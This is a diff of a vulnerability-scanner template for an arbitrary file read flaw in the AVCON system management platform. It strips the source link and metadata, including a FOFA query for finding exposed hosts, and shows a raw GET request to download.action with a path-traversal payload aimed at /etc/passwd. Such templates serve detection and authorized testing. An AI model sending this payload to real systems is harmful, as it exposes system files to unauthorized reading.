@@ -3,12 +3,8 @@ info:
   name: AVCON-系统管理平台 download.action 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmg5hxzueamxsnm6'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gmg5hxzueamxsnm6
-    fofa: title="AVCON-系统管理平台"
 http:
 - raw:
   - 'GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1
